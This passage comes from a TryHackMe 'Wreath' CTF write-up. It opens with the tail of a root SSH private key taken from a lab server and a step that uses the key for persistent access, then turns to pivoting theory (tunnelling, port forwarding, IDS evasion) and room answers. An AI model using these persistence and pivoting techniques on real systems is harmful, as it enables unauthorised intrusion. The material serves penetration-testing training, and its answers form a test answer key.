DZwEYbkM7/kXMgDKMIp2cdBMP+VypVAAAAwQDV5v0L5wWZPlzgd54vK8BfN5o5gIuhWOkB
2I2RDhVCoyyFH0T4Oqp1asVrpjwWpOd+0rVDT8I6rzS5/VJ8OOYuoQzumEME9rzNyBSiTw
YlXRN11U6IKYQMTQgXDcZxTx+KFp8WlHV9NE2g3tHwagVTgIzmNA7EPdENzuxsXFwFH9TY
EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by
GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg==
-----END OPENSSH PRIVATE KEY-----
[root@prod-serv .ssh]#

```

7. **Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to obtain persistent access to the box.**

**We have everything we need for now. Let's move on to the next section: Pivoting!**

- **_Ans: No Answer Needed._**

---

### Task 7: Pivoting What is Pivoting? 

Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.

Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and use it to access other machines in the network that would not otherwise be accessible:

![Pivoting](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-9.png)

In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public server, we can then pivot to attack the remaining three targets.

**_Note_**: _This is an example diagram and is not representative of the Wreath Network._

This section will contain a lot of theory for pivoting from both Linux and Windows compromised targets, which we will then put into practice against the next machine in the network. Remember though: you have a sandbox environment available to you with the compromised machine in the Wreath network. After the enumeration tasks coming up, you'll also know about the next machine in the network. Feel free to use these boxes to play around with the tools as you go through the tasks, but be aware that some techniques may be stopped by the firewalls involved (which we will look at mitigating later in the network).


**_Answer the questions below_**

1. **Read the pivoting introduction**
- **_No Answer Needed._**

---

### Task 8: Pivoting High-level Overview 


The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being, we'll be looking at more manual techniques for pivoting.

There are two main methods encompassed in this area of pentesting:

- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host

A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box at the top of the screen.

As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.

The remaining tasks in this section will cover the following topics:

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.

**_Answer the questions below_**

1. **Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?**
- **_Tunnelling_**

2. **Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?**

- **_Ans: Portfwd_**

![Port Forwarding with Metasploit](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-10.png)

---
